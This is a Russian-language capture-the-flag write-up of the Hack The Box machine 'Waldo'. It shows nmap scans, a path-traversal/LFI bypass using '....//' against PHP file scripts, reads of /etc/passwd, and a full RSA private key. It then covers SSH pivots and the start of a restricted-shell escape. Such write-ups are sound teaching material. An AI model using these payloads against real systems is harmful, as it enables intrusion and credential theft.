---
layout: post
title: "HTB: Waldo Write-Up"
date: 2018-12-29 17:00:00 +0300
author: snovvcrash
categories: ctf write-ups boxes hackthebox
tags: [ctf, write-ups, boxes, hackthebox, Waldo, linux, path-traversal, lfi, jq, docker, restricted-shell, rbash, capabilities]
comments: true
published: true
---

**Waldo** — несложная Linux-коробка, внутри которой затерялся злосчастный Вальдо. Неотъемлемой частью процедуры поиска последнего станут такие развлечения, как эксплуатация уязвимого к атаке типа "*Path Traversal + LFI*" веб-приложения, таинственная маршрутизация в docker-контейнер при пожключении к Waldo по SSH, обнаружение альтернативного SSH-ключа и подключение к реальной виртуальной машине с помощью оного, побег из *restricted-shell*'а (*rbash*) и, на сладкое, чтение файлов с правами root через абьюзинг утилиты с установленным мандатом *CAP_DAC_READ_SEARCH* из арсенала одного из механизмов управления доступом в Линукс — *Linux Capabilities*. Итак, где же Вальдо? **Сложность: 5/10**{:style="color:grey;"}

<!--cut-->

{: .center-image}
[![waldo-banner.png]({{ "/img/htb/boxes/waldo/waldo-banner.png" | relative_url }})](https://www.hackthebox.eu/home/machines/profile/149 "Hack The Box :: Waldo")

{: .center-image}
![waldo-info.png]({{ "/img/htb/boxes/waldo/waldo-info.png" | relative_url }})

* TOC
{:toc}

# Nmap
Initial:
```text
root@kali:~# nmap -n -vvv -sS -Pn --min-rate 5000 -oA nmap/initial 10.10.10.87
...
```

```text
root@kali:~# cat nmap/initial.nmap
# Nmap 7.70 scan initiated Sat Dec 22 22:43:34 2018 as: nmap -n -vvv -sS -Pn --min-rate 5000 -oA nmap/initial 10.10.10.87
Nmap scan report for 10.10.10.87
Host is up, received user-set (0.14s latency).
Scanned at 2018-12-22 22:43:34 MSK for 1s
Not shown: 997 closed ports
Reason: 997 resets
PORT     STATE    SERVICE        REASON
22/tcp   open     ssh            syn-ack ttl 63
80/tcp   open     http           syn-ack ttl 63
8888/tcp filtered sun-answerbook no-response

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Dec 22 22:43:35 2018 -- 1 IP address (1 host up) scanned in 0.78 seconds
```

Version ([красивый отчет]({{ "/nmap/htb-waldo-nmap-version.html" | relative_url }})):
```text
root@kali:~# nmap -n -vvv -sS -sV -sC -oA nmap/version --stylesheet https://raw.githubusercontent.com/snovvcrash/snovvcrash.github.io/master/misc/nmap-bootstrap.xsl -p22,80,8888 10.10.10.87
...
```

```text
root@kali:~# cat nmap/version.nmap
# Nmap 7.70 scan initiated Sat Dec 22 22:45:04 2018 as: nmap -n -vvv -sS -sV -sC -oA nmap/version --stylesheet https://raw.githubusercontent.com/snovvcrash/snovvcrash.github.io/master/misc/nmap-bootstrap.xsl -p22,80,8888 10.10.10.87
Nmap scan report for 10.10.10.87
Host is up, received echo-reply ttl 63 (0.14s latency).
Scanned at 2018-12-22 22:45:05 MSK for 12s

PORT     STATE    SERVICE        REASON         VERSION
22/tcp   open     ssh            syn-ack ttl 63 OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey: 
|   2048 c4:ff:81:aa:ac:df:66:9e:da:e1:c8:78:00:ab:32:9e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCUBrGVTenfm2F4qteJkyDe6hVIFmu8bbhvIHpgyeurAI6685LtchiyT67l6xdhhc4jKe9kPp7Sb123/oqHf0lkoHywgwn2VI4Fxbj2QUoRw6LXeT1UL3W9vYMNazvGgjriv7S/pfXZA9E0IGIGauQfWhMsh2LMi7R9XLCgvtglmEe+PJP3PtR1OosHIYJzbF9iP/gaN303eDZXkDbWlIcr5hLDFDw/OLPYY1ew8oHMdJKs/WSEZfbRJFE6NTfjuumX5Sfbo8lk5jcWZ683BUeHK8PFknqlDQnqLa2F9M4vq9vSXvDNfd315vaLpLoA/OymCyXzamwXVVEUI4hm7oMj
|   256 b3:e7:54:6a:16:bd:c9:29:1f:4a:8c:cd:4c:01:24:27 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOGNlwRr8whDd+DtY94Sa6uDIuCTTnDO9rp4ezQyJRbB866Useclk0U03GooZdUNgcyHttrfBhrLRbNp4EYmSEg=
|   256 38:64:ac:57:56:44:d5:69:de:74:a8:88:dc:a0:b4:fd (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILhvDtrIfnHWdGIA3ewprB+7ZA1wfv/PcQtO/vlNHaks
80/tcp   open     http           syn-ack ttl 63 nginx 1.12.2
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.12.2
| http-title: List Manager
|_Requested resource was /list.html
|_http-trane-info: Problem with XML parsing of /evox/about
8888/tcp filtered sun-answerbook no-response

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Dec 22 22:45:17 2018 -- 1 IP address (1 host up) scanned in 13.11 seconds
```

Имеем SSH (22), веб-сервер на nginx'е (80) и что-то непонятное, скорее всего, скрытое за файрволом, который, в свою очередь, нагло дропает наши запросы (8888).

Начинаем с веба.

# Web — Порт 80
## Браузер
На `http://10.10.10.87:80` нас встречает веб-сайт, окрашенный в тему [Where's Waldo ? In Hollywood (Book 4 - Scene 3)](https://www.deviantart.com/where-is-waldo-wally/art/Where-s-Waldo-In-Hollywood-Book-4-Scene-3-462460774 "Where's Waldo ? In Hollywood (Book 4 - Scene 3) by Where-is-Waldo-Wally on DeviantArt"), который представляет из себя "менеджер списков":

[![waldo-port80-browser-1.png]({{ "/img/htb/boxes/waldo/waldo-port80-browser-1.png" | relative_url }})]({{ "/img/htb/boxes/waldo/waldo-port80-browser-1.png" | relative_url }})

## Burp Suite
Пропустив трафик через локальную проксю Burp'а и осмотревшись на сайте, я составил следующий маппинг "действие → скрипт.php", где *действие* — функция, предоставленная приложением (менеджером списков), *скрипт.php* — PHP-скрипт, отвечающий за выполнение соответствующей функции:
  - удаление списка → `fileDelete.php`;
  - листинг всех списков → `dirRead.php`;
  - открытие списка → `fileRead.php`;
  - модификация списка → `fileWrite.php`.

[![waldo-port80-burp.png]({{ "/img/htb/boxes/waldo/waldo-port80-burp.png" | relative_url }})]({{ "/img/htb/boxes/waldo/waldo-port80-burp.png" | relative_url }})

На скриншоте выше приведена история Burp'а после выполнения такой последовательности действий после загрузки главной страницы:

1\. удаление списка № 3 и автоматическое обновление листинга списков (`fileDelete.php` + `dirRead.php`):
```http
POST /fileDelete.php HTTP/1.1
Host: 10.10.10.87
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.87/list.html
Content-type: application/x-www-form-urlencoded
Content-Length: 9
DNT: 1
Connection: close

listnum=3
```

```http
POST /dirRead.php HTTP/1.1
Host: 10.10.10.87
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.87/list.html
Content-type: application/x-www-form-urlencoded
Content-Length: 13
DNT: 1
Connection: close

path=./.list/
```

2\. открытие списка № 2 (`fileRead.php`):
```http
POST /fileRead.php HTTP/1.1
Host: 10.10.10.87
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.87/list.html
Content-type: application/x-www-form-urlencoded
Content-Length: 18
DNT: 1
Connection: close

file=./.list/list2
```

3\. добавление трех элементов в список № 2 (`fileWrite.php` x3):
```http
POST /fileWrite.php HTTP/1.1
Host: 10.10.10.87
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.87/list.html
Content-type: application/x-www-form-urlencoded
Content-Length: 26
DNT: 1
Connection: close

listnum=2&data={"1":"One"}
```

```http
POST /fileWrite.php HTTP/1.1
Host: 10.10.10.87
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.87/list.html
Content-type: application/x-www-form-urlencoded
Content-Length: 36
DNT: 1
Connection: close

listnum=2&data={"1":"One","2":"Two"}
```

```http
POST /fileWrite.php HTTP/1.1
Host: 10.10.10.87
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.87/list.html
Content-type: application/x-www-form-urlencoded
Content-Length: 48
DNT: 1
Connection: close

listnum=2&data={"1":"One","2":"Two","3":"Three"}
```

[![waldo-port80-browser-2.png]({{ "/img/htb/boxes/waldo/waldo-port80-browser-2.png" | relative_url }})]({{ "/img/htb/boxes/waldo/waldo-port80-browser-2.png" | relative_url }})

4\. возврат на главную страницу и автоматическое обновление листинга списков (`dirRead.php`):
```http
POST /dirRead.php HTTP/1.1
Host: 10.10.10.87
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.87/list.html
Content-type: application/x-www-form-urlencoded
Content-Length: 13
DNT: 1
Connection: close

path=./.list/
```

## Path Traversal + LFI
Для начала попробуем воспользоваться скриптом `dirRead.php` в корыстных целях, а именно — запросить листинг произвольной директории.

Рабочая директория возвращается без проблем:
```text
root@kali:~# curl -s -X POST -d 'path=.' http://10.10.10.87/dirRead.php
[".","..",".list","background.jpg","cursor.png","dirRead.php","face.png","fileDelete.php","fileRead.php","fileWrite.php","index.php","list.html","list.js"]
```

Корень определен сюда же (это было видно еще из Burp-запросов):
```text
root@kali:~# curl -s -X POST -d 'path=/' http://10.10.10.87/dirRead.php
[".","..",".list","background.jpg","cursor.png","dirRead.php","face.png","fileDelete.php","fileRead.php","fileWrite.php","index.php","list.html","list.js"]
```

И вырваться назад с помощью `../` не получается:
```text
root@kali:~# curl -s -X POST -d 'path=../../' http://10.10.10.87/dirRead.php
[".","..",".list","background.jpg","cursor.png","dirRead.php","face.png","fileDelete.php","fileRead.php","fileWrite.php","index.php","list.html","list.js"]
```

Значит, стоят фильтры строк пути. Теперь настала очередь в корыстных целях воспользоваться скриптом `fileRead.php`, а именно — запросить содержимое произвольного файла.

Посмотрим на исходники `dirRead.php` для определения метода фильтрации (для того, чтобы получить код в читаемом виде, отлично подойдет [jq](https://stedolan.github.io/jq/ "jq") — топовый JSON-процессор):
```text
root@kali:~# curl -s -X POST -d 'file=dirRead.php' http://10.10.10.87/fileRead.php | jq -r .'file'
```

```php
<?php

if($_SERVER['REQUEST_METHOD'] === "POST"){
        if(isset($_POST['path'])){
                header('Content-type: application/json');
                $_POST['path'] = str_replace( array("../", "..\""), "", $_POST['path']);
                echo json_encode(scandir("/var/www/html/" . $_POST['path']));
        }else{
                header('Content-type: application/json');
                echo '[false]';
        }
}
```

Как и ожидалось, строка `"../"` заменяется пустотой `""`.

Теперь взглянем на исходники `fileRead.php`:
```text
root@kali:~# curl -s -X POST -d 'file=fileRead.php' http://10.10.10.87/fileRead.php | jq -r .'file'
```

```php
<?php


if($_SERVER['REQUEST_METHOD'] === "POST"){
        $fileContent['file'] = false;
        header('Content-Type: application/json');
        if(isset($_POST['file'])){
                header('Content-Type: application/json');
                $_POST['file'] = str_replace( array("../", "..\""), "", $_POST['file']);
                if(strpos($_POST['file'], "user.txt") === false){
                        $file = fopen("/var/www/html/" . $_POST['file'], "r");
                        $fileContent['file'] = fread($file,filesize($_POST['file']));
                        fclose();
                }
        }
        echo json_encode($fileContent);
}
```

Такое же правило фильтрации *плюс* дополнительное ограничение: запрет на чтение файла `user.txt`. Не очень-то и хотелось, ибо вектор атаки напрашивается сам собой: функция `str_replace()` вызывается **нерекурсивно**, поэтому последовательность `"....//"` превратится в нужную нам `"../"` после того, как к ней будет применен описанный выше фильтр.

Таким образом, попробуем прочитать `/etc/passwd` для того, чтобы проверить теорию на практике:
```text
root@kali:~# curl -s -X POST -d 'file=....//....//....//etc/passwd' http://10.10.10.87/fileRead.php | jq -r .'file'
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/bin/sh
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
postgres:x:70:70::/var/lib/postgresql:/bin/sh
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/home/nobody:/bin/sh
nginx:x:100:101:nginx:/var/lib/nginx:/sbin/nologin
```

IT'S ALIVE :smiling_imp:

Пойдем дальше и исследуем домашнюю директорию пользователя, отыскав в ней SSH-ключ:
```text
root@kali:~# curl -s -X POST -d "path=....//....//....//" http://10.10.10.87/dirRead.php | jq
[
  ".",
  "..",
  ".dockerenv",
  "bin",
  "dev",
  "etc",
  "home",
  "lib",
  "media",
  "mnt",
  "proc",
  "root",
  "run",
  "sbin",
  "srv",
  "sys",
  "tmp",
  "usr",
  "var"
]
root@kali:~# curl -s -X POST -d "path=....//....//....//home" http://10.10.10.87/dirRead.php | jq
[
  ".",
  "..",
  "nobody"
]
root@kali:~# curl -s -X POST -d "path=....//....//....//home/nobody" http://10.10.10.87/dirRead.php | jq
[
  ".",
  "..",
  ".ash_history",
  ".ssh",
  ".viminfo",
  "user.txt"
]
root@kali:~# curl -s -X POST -d "path=....//....//....//home/nobody/.ssh" http://10.10.10.87/dirRead.php | jq
[
  ".",
  "..",
  ".monitor",
  "authorized_keys",
  "known_hosts"
]
```

```text
root@kali:~# curl -s -X POST -d 'file=....//....//....//home/nobody/.ssh/.monitor' http://10.10.10.87/fileRead.php | jq -r .'file'
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAs7sytDE++NHaWB9e+NN3V5t1DP1TYHc+4o8D362l5Nwf6Cpl
mR4JH6n4Nccdm1ZU+qB77li8ZOvymBtIEY4Fm07X4Pqt4zeNBfqKWkOcyV1TLW6f
87s0FZBhYAizGrNNeLLhB1IZIjpDVJUbSXG6s2cxAle14cj+pnEiRTsyMiq1nJCS
dGCc/gNpW/AANIN4vW9KslLqiAEDJfchY55sCJ5162Y9+I1xzqF8e9b12wVXirvN
o8PLGnFJVw6SHhmPJsue9vjAIeH+n+5Xkbc8/6pceowqs9ujRkNzH9T1lJq4Fx1V
vi93Daq3bZ3dhIIWaWafmqzg+jSThSWOIwR73wIDAQABAoIBADHwl/wdmuPEW6kU
vmzhRU3gcjuzwBET0TNejbL/KxNWXr9B2I0dHWfg8Ijw1Lcu29nv8b+ehGp+bR/6
pKHMFp66350xylNSQishHIRMOSpydgQvst4kbCp5vbTTdgC7RZF+EqzYEQfDrKW5
8KUNptTmnWWLPYyJLsjMsrsN4bqyT3vrkTykJ9iGU2RrKGxrndCAC9exgruevj3q
1h+7o8kGEpmKnEOgUgEJrN69hxYHfbeJ0Wlll8Wort9yummox/05qoOBL4kQxUM7
VxI2Ywu46+QTzTMeOKJoyLCGLyxDkg5ONdfDPBW3w8O6UlVfkv467M3ZB5ye8GeS
dVa3yLECgYEA7jk51MvUGSIFF6GkXsNb/w2cZGe9TiXBWUqWEEig0bmQQVx2ZWWO
v0og0X/iROXAcp6Z9WGpIc6FhVgJd/4bNlTR+A/lWQwFt1b6l03xdsyaIyIWi9xr
xsb2sLNWP56A/5TWTpOkfDbGCQrqHvukWSHlYFOzgQa0ZtMnV71ykH0CgYEAwSSY
qFfdAWrvVZjp26Yf/jnZavLCAC5hmho7eX5isCVcX86MHqpEYAFCecZN2dFFoPqI
yzHzgb9N6Z01YUEKqrknO3tA6JYJ9ojaMF8GZWvUtPzN41ksnD4MwETBEd4bUaH1
/pAcw/+/oYsh4BwkKnVHkNw36c+WmNoaX1FWqIsCgYBYw/IMnLa3drm3CIAa32iU
LRotP4qGaAMXpncsMiPage6CrFVhiuoZ1SFNbv189q8zBm4PxQgklLOj8B33HDQ/
lnN2n1WyTIyEuGA/qMdkoPB+TuFf1A5EzzZ0uR5WLlWa5nbEaLdNoYtBK1P5n4Kp
w7uYnRex6DGobt2mD+10cQKBgGVQlyune20k9QsHvZTU3e9z1RL+6LlDmztFC3G9
1HLmBkDTjjj/xAJAZuiOF4Rs/INnKJ6+QygKfApRxxCPF9NacLQJAZGAMxW50AqT
rj1BhUCzZCUgQABtpC6vYj/HLLlzpiC05AIEhDdvToPK/0WuY64fds0VccAYmMDr
X/PlAoGAS6UhbCm5TWZhtL/hdprOfar3QkXwZ5xvaykB90XgIps5CwUGCCsvwQf2
DvVny8gKbM/OenwHnTlwRTEj5qdeAM40oj/mwCDc6kpV1lJXrW2R5mCH9zgbNFla
W0iKCBUAm5xZgU/YskMsCBMNmA8A5ndRWGFEFE+VGDVPaRie0ro=
-----END RSA PRIVATE KEY-----
```

# SSH — Порт 22 (внутри машины)
Врываемся:
```text
root@kali:~# curl -s -X POST -d 'file=....//....//....//home/nobody/.ssh/.monitor' http://10.10.10.87/fileRead.php | jq -r .'file' > nobody.key
root@kali:~# chmod 600 nobody.key
```

```text
root@kali:~# ssh -oStrictHostKeyChecking=no -i nobody.key nobody@10.10.10.87
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <http://wiki.alpinelinux.org>.
waldo:~$ whoami
nobody
waldo:~$ id
uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)
waldo:~$ uname  -a
Linux waldo 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1 (2018-04-29) x86_64 Linux
```

```text
waldo:~$ ls -la
total 20
drwxr-xr-x    1 nobody   nobody        4096 Jul 24 13:30 .
drwxr-xr-x    1 root     root          4096 May  3  2018 ..
lrwxrwxrwx    1 root     root             9 Jul 24 11:57 .ash_history -> /dev/null
drwx------    1 nobody   nobody        4096 Jul 15 14:07 .ssh
-rw-------    1 nobody   nobody        1202 Jul 24 13:28 .viminfo
-r--------    1 nobody   nobody          33 May  3  2018 user.txt
```

Alpine! Одно это уже заставляет задуматься о том, что мы можем находиться внутри докера.

Заберем флаг и отправимся дальше гулять по системе:
## user.txt
```text
waldo:~$ cat /home/nobody/user.txt
32768bcd????????????????????????
```

Первым делом, хочу выяснить, что творится на таинственном 8888-м порту:
```text
waldo:~$ netstat -anlp | grep 8888
netstat: can't scan /proc - are you root?
tcp        0      0 0.0.0.0:8888            0.0.0.0:*                LISTEN      -
tcp        0     84 10.10.10.87:8888        10.10.14.14:37530        ESTABLISHED -
tcp        0      0 :::8888                 :::*                     LISTEN      -
```

Хмм, здесь творится что-то странное: netstat говорит, что я подключен именно к 8888-у порту, хотя должен быть к 22-у (SSH же).

ifconfig окончательно палит ситуацию и без зазрения совести кричит, что мы внутри *контейнера*:
```text
waldo:~$ ifconfig
docker0   Link encap:Ethernet  HWaddr 02:42:05:61:2E:1C
          inet addr:172.17.0.1  Bcast:172.17.255.255  Mask:255.255.0.0
          UP BROADCAST MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)

ens33     Link encap:Ethernet  HWaddr 00:50:56:B2:2C:DE
          inet addr:10.10.10.87  Bcast:10.10.10.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:1114556 errors:0 dropped:309 overruns:0 frame:0
          TX packets:861875 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:137402816 (131.0 MiB)  TX bytes:166699257 (158.9 MiB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:2359604 errors:0 dropped:0 overruns:0 frame:0
          TX packets:2359604 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1
          RX bytes:294171911 (280.5 MiB)  TX bytes:294171911 (280.5 MiB)
```

Значит, картина складывается примерно такая: мы подключаемся к 22-у порту SSH к ВМ Waldo (IP 10.10.10.87), после чего посредством магии маршрутизации нас бросает в docker-контейнер (IP 172.17.0.1) на порт 8888. Следовательно, было бы неплохо выбраться отсюда в "реальный мир" виртуалки Waldo.

## PrivEsc: nobody → monitor
Посмотрим еще раз на директорию с SSH-секретами:
```text
waldo:~/.ssh$ ls -la
total 20
drwx------    1 nobody   nobody        4096 Jul 15 14:07 .
drwxr-xr-x    1 nobody   nobody        4096 Jul 24 13:30 ..
-rw-------    1 nobody   nobody        1675 May  3  2018 .monitor
-rw-------    1 nobody   nobody         394 May  3  2018 authorized_keys
-rw-r--r--    1 nobody   nobody         342 Dec 17 19:50 known_hosts
```

В `known_hosts` есть упоминание `127.0.0.1`:
```text
waldo:~/.ssh$ cat known_hosts
localhost ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMsMoPYC4gQXgpVm2SlVUPuagi1mP6V4l5zynWW5f2CogESxxB/uWRLnTMjVdqL279PojOB+3n5iXLAB2sg1Bho=
127.0.0.1 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMsMoPYC4gQXgpVm2SlVUPuagi1mP6V4l5zynWW5f2CogESxxB/uWRLnTMjVdqL279PojOB+3n5iXLAB2sg1Bho=
```

А `authorized_keys` говорит о существовании некоего пользователя "monitor":
```text
waldo:~/.ssh$ cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzuzK0MT740dpYH17403dXm3UM/VNgdz7ijwPfraXk3B/oKmWZHgkfqfg1xx2bVlT6oHvuWLxk6/KYG0gRjgWbTtfg+q3jN40F+opaQ5zJXVMtbp/zuzQVkGFgCLMas014suEHUhkiOkNUlRtJcbqzZzECV7XhyP6mcSJFOzIyKrWckJJ0YJz+A2lb8AA0g3i9b0qyUuqIAQMl9yFjnmwInnXrZj34jXHOoXx71vXbBVeKu82jw8sacUlXDpIeGY8my572+MAh4f6f7leRtzz/qlx6jCqz26NGQ3Mf1PWUmrgXHVW+L3cNqrdtnd2EghZpZp+arOD6NJOFJY4jBHvf monitor@waldo
```

Поэтому, не долго думая, инициируем еще одно SSH-подключение к loopback-адресу изнутри докера под пользователем monitor:
```text
waldo:~/.ssh$ ssh -oStrictHostKeyChecking=no -i .monitor monitor@127.0.0.1
Linux waldo 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1 (2018-04-29) x86_64
           &.
          @@@,@@/ %
       #*/%@@@@/.&@@,
   @@@#@@#&@#&#&@@@,*%/
   /@@@&###########@@&*(*
 (@################%@@@@@.     /**
 @@@@&#############%@@@@@@@@@@@@@@@@@@@@@@@@%((/
 %@@@@%##########&@@@....                 .#%#@@@@@@@#
 @@&%#########@@@@/                        */@@@%(((@@@%
    @@@#%@@%@@@,                       *&@@@&%(((#((((@@(
     /(@@@@@@@                     *&@@@@%((((((((((((#@@(
       %/#@@@/@ @#/@          ..@@@@%(((((((((((#((#@@@@@@@@@@@@&#,
          %@*(@#%@.,       /@@@@&(((((((((((((((&@@@@@@&#######%%@@@@#    &
        *@@@@@#        .&@@@#(((#(#((((((((#%@@@@@%###&@@@@@@@@@&%##&@@@@@@/
       /@@          #@@@&#(((((((((((#((@@@@@%%%%@@@@%#########%&@@@@@@@@&
      *@@      *%@@@@#((((((((((((((#@@@@@@@@@@%####%@@@@@@@@@@@@###&@@@@@@@&
      %@/ .&%@@%#(((((((((((((((#@@@@@@@&#####%@@@%#############%@@@&%##&@@/
      @@@@@@%(((((((((((##(((@@@@&%####%@@@%#####&@@@@@@@@@@@@@@@&##&@@@@@@@@@/
     @@@&(((#((((((((((((#@@@@@&@@@@######@@@###################&@@@&#####%@@*
     @@#(((((((((((((#@@@@%&@@.,,.*@@@%#####@@@@@@@@@@@@@@@@@@@%####%@@@@@@@@@@
     *@@%((((((((#@@@@@@@%#&@@,,.,,.&@@@#####################%@@@@@@%######&@@.
       @@@#(#&@@@@@&##&@@@&#@@/,,,,,,,,@@@&######&@@@@@@@@&&%######%@@@@@@@@@@@
        @@@@@@&%&@@@%#&@%%@@@@/,,,,,,,,,,/@@@@@@@#/,,.*&@@%&@@@@@@&%#####%@@@@.
          .@@@###&@@@%%@(,,,%@&,.,,,,,,,,,,,,,.*&@@@@&(,*@&#@%%@@@@@@@@@@@@*
            @@%##%@@/@@@%/@@@@@@@@@#,,,,.../@@@@@%#%&@@@@(&@&@&@@@@(
            .@@&##@@,,/@@@@&(.  .&@@@&,,,.&@@/         #@@%@@@@@&@@@/
           *@@@@@&@@.*@@@          %@@@*,&@@            *@@@@@&.#/,@/
          *@@&*#@@@@@@@&     #@(    .@@@@@@&    ,@@@,    @@@@@(,@/@@
          *@@/@#.#@@@@@/    %@@@,   .@@&%@@@     &@&     @@*@@*(@@#
           (@@/@,,@@&@@@            &@@,,(@@&          .@@%/@@,@@
             /@@@*,@@,@@@*         @@@,,,,,@@@@.     *@@@%,@@**@#
               %@@.%@&,(@@@@,  /&@@@@,,,,,,,%@@@@@@@@@@%,,*@@,#@,
                ,@@,&@,,,,(@@@@@@@(,,,,,.,,,,,,,,**,,,,,,.*@/,&@
                 &@,*@@.,,,,,..,,,,&@@%/**/@@*,,,,,&(.,,,.@@,,@@
                 /@%,&@/,,,,/@%,,,,,*&@@@@@#.,,,,,.@@@(,,(@@@@@(
                  @@*,@@,,,#@@@&*..,,,,,,,,,,,,/@@@@,*(,,&@/#*
                  *@@@@@(,,@*,%@@@@@@@&&#%@@@@@@@/,,,,,,,@@
                       @@*,,,,,,,,,.*/(//*,..,,,,,,,,,,,&@,
                        @@,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,@@
                        &@&,,,,,,,,,,,,,,,,,,,,,,,,,,,,&@#
                         %@(,,,,,,,,,,,,,,,,,,,,,,,,,,,@@
                         ,@@,,,,,,,,@@@&&&%&@,,,,,..,,@@,
                          *@@,,,,,,,.,****,..,,,,,,,,&@@
                           (@(,,,.,,,,,,,,,,,,,,.,,,/@@
                           .@@,,,,,,,,,,,,,...,,,,,,@@
                            ,@@@,,,,,,,,,,,,,,,,.(@@@
                              %@@@@&(,,,,*(#&@@@@@@,

                            Here's Waldo, where's root?
Last login: Wed Dec 19 23:56:41 2018 from 127.0.0.1
-rbash: alias: command not found
```

И-и-и... Мы нашли Вальдо!

Только вот мы в "тюрьме" (aka *Restricted Shell*) :lock:
```text
monitor@waldo:~$ whoami
-rbash: whoami: command not found
monitor@waldo:~$ id
-rbash: id: command not found
monitor@waldo:~$ cd /
-rbash: cd: restricted
```

## Побег из Restricted-Shell'а
Посмотрим, что скрывает переменная `PATH`:
```text
monitor@waldo:~$ echo $PATH
/home/monitor/bin:/home/monitor/app-dev:/home/monitor/app-dev/v0.1
```

Логично предположить, что мы имеем доступ к тому, что находится в пределах этих директорий.

А содержат они следующее:

1\. `/home/monitor/bin`
```text
monitor@waldo:~$ ls -la /home/monitor/bin
total 8
dr-xr-x--- 2 root monitor 4096 May  3  2018 .
drwxr-x--- 5 root monitor 4096 Jul 24 07:58 ..
lrwxrwxrwx 1 root root       7 May  3  2018 ls -> /bin/ls
lrwxrwxrwx 1 root root      13 May  3  2018 most -> /usr/bin/most
lrwxrwxrwx 1 root root       7 May  3  2018 red -> /bin/ed
lrwxrwxrwx 1 root root       9 May  3  2018 rnano -> /bin/nano
```

2\. `/home/monitor/app-dev`
```text
monitor@waldo:~$ ls -la /home/monitor/app-dev
total 2236
drwxrwx--- 3 app-dev monitor    4096 May  3  2018 .
drwxr-x--- 5 root    monitor    4096 Jul 24 07:58 ..
-rwxrwx--- 1 app-dev monitor   13704 Jul 24 08:10 logMonitor
-r--r----- 1 app-dev monitor   13704 May  3  2018 logMonitor.bak
-rw-rw---- 1 app-dev monitor    2677 May  3  2018 logMonitor.c
-rw-rw---- 1 app-dev monitor     488 May  3  2018 logMonitor.h
-rw-rw---- 1 app-dev monitor 2217712 May  3  2018 logMonitor.h.gch
